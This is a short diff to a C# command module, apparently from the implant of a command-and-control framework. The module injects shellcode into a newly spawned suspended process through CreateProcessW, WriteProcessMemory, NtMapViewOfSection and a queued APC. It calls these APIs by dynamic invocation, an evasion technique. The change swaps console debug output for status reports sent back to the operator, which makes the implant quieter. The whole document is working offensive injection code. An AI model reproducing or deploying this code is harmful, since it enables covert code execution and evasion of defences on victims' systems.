@@ -37,7 +37,7 @@ namespace Engineer.Commands
             byte[] shellcode = task.File;
 
             // spawn new process 
-            Console.WriteLine("attempting to create new process");
+            Tasking.FillTaskResults("Creating new process", task, EngTaskStatus.Running,TaskResponseType.String);
             var createProcessParameters = new object[] { $@"{SpawnTo.spawnToPath}", null, ta, pa, false, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", si, pi };
             object successCreateProcess = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "CreateProcessW", typeof(WinApiDynamicDelegate.CreateProcessW), createProcessParameters);
             // makes sure we have access to the correct (out) pi values from the API invoke
@@ -78,7 +78,6 @@ namespace Engineer.Commands
             // invoke the api call, pass the dll, function name, delegate type, parameters        
             reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
             numberOfBytes = (IntPtr)writeProcessParameters[4];
-            Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");
 
             // dinvoke map view of section remote which basically copies shellcode
             IntPtr remoteBaseAddress = new IntPtr();
@@ -86,7 +85,6 @@ namespace Engineer.Commands
             // invoke the api call, pass the dll, function name, delegate type, parameters        
             reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
             remoteBaseAddress = (IntPtr)mapViewParameters[2];
-            Console.WriteLine($"Mapped view to target");
 
             // Queue user APC
             var queueUserParameters = new object[] { remoteBaseAddress, hThread, (uint)0 };
